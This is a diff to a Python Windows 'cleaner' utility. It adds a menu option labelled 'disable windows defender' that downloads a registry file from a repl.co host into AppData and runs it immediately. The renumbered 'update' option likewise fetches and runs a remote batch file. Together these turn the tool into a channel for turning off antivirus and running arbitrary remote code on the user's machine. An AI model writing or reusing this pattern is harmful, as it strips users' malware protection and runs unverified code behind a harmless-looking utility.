@@ -8,8 +8,11 @@ import requests
 import subprocess
 from colorama import Fore
 from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+from pathlib import Path
 
-
+dir = os.path.join("C:\\", "temp", "python")
+if not os.path.exists(dir):
+    os.mkdir(dir)
 
 
 
@@ -31,7 +34,7 @@ System.Clear()
 Anime.Fade(Center.XCenter(banner), Colors.rainbow, Colorate.Vertical, interval=0.025, enter=True)
 os.system("title fr cleaner")
 banner = Center.XCenter("""
-beta ver 1.0
+ver 1.0
 ███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
 ██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
 █████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
@@ -51,9 +54,10 @@ options = """
 6.)    turn on hibernate
 7.)    tree (better Responsiveness)
 8.)    Delete Windows Update Cache
-9.)    update
-10.)   more info
-11.)   exit
+9.)    disable windows defender
+10.)   update 
+11.)   more info
+12.)   exit
 """
 def main():
     os.system('cls')
@@ -135,6 +139,15 @@ def main():
         print ("done")
         main()
     elif choice == '9':
+        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/def.reg"
+        r = requests.get(url)  
+        username = os.getlogin()
+        with open(fr"\Users\{username}\AppData\Roaming\def.reg", 'wb') as f:
+           f.write(r.content)
+        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\def.reg")
+        print ("done")
+        main()
+    elif choice == '10':
         url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
         r = requests.get(url)  
         username = os.getlogin()
@@ -142,15 +155,15 @@ def main():
            f.write(r.content)
         subprocess.os.system(fr"\Users\{username}\AppData\Roaming\updater.bat")
         print ("done")
-        main()
-    elif choice == '10':
+        main()    
+    elif choice == '11':
         os.system('cls')
         print(Colors.red, "made by dynasty still in beta ver", )
         input("Press Enter to continue...")
         main()
-    elif choice == '11':
+    elif choice == '12':
        os._exit(0)  
-    elif choice != ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10','11' ]:
+    elif choice != ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12']:
         print("That ain't an option\n")
         print("RESTARTING!!!")
         time.sleep(2)
